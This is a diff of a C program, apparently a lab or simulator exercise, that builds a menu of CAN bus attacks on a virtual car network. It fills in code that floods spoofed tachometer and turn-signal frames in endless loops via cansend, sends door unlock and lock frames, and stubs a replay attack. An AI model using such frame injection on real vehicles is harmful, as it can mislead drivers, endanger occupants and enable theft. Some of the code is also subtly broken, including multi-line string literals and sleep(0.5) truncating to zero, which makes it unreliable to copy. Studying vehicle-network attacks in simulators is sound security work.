@@ -37,27 +37,42 @@ int attack_menu(void){
         * 2) Tachometer Spoofing\n
         * 3) Turn Signal Spoofing\n
         * 4) Door Unlock Attack\n
-        ")
+        ");
     scanf("%d", &attack_selection);
     return attack_selection;
 }
 
-void replay_attack(int logging_time){
+void replay_attack(void){
     //call "candump vcan0 -l"
     //send a "CTRL+C" after specified number of seconds to quit logging
     //call "canplayer -I canfile.log" on the latest logfile to replay
+
+    int logging_time = 0;
+    printf("How long to log for in seconds?\n");
+    scanf("%d", &logging_time);
 }
 
 void tachometer_spoofing(void){
     //call "while true; do cansend vcan0 244#000000AAFF; done"
+    //spoofs tachometer to the max RPM
+    while(true){
+        system("cansend vcan0 244#000000FFFF");
+    }
 }
 
 void turnsignal_spoofing(void){
     //call "while true; do cansend vcan0 188#03; sleep 0.75; cansend vcan0 188#01;
     //sleep 0.75; done"
+    //turns on hazards then blinks the left signal and repeats
+    while(true){
+        system("cansend vcan0 188#03");
+        sleep(0.5);
+        system("cansend vcan0 188#01");
+        sleep(0.5);
+    }
 }
 
-void door_unlock_attack(int door_to_unlock){
+void door_unlock_attack(void){
     int door_selection;
     printf("
         Which door to unlock?\n
@@ -67,7 +82,7 @@ void door_unlock_attack(int door_to_unlock){
         4) Passenger Rear\n
         5) All\n
         6) Lock All\n
-        ")
+        ");
     scanf("%d", &door_selection);
     switch(door_selection){
         case 1: 
@@ -88,10 +103,31 @@ void door_unlock_attack(int door_to_unlock){
         case 6:
             system("cansend vcan0 19B#00000F");
             break;
+        default:
+            break;
     }
 }
 
 int main(int argc, char **argv)
 {
+    int attack_selection = attack_menu();
+
+    switch(attack_selection){
+        case 1:
+            replay_attack();
+            break;
+        case 2:
+            tachometer_spoofing();
+            break;
+        case 3:
+            turnsignal_spoofing();
+            break;
+        case 4:
+            door_unlock_attack();
+            break;
+        default:
+            break;
+    }
+
 	return 0;
 }
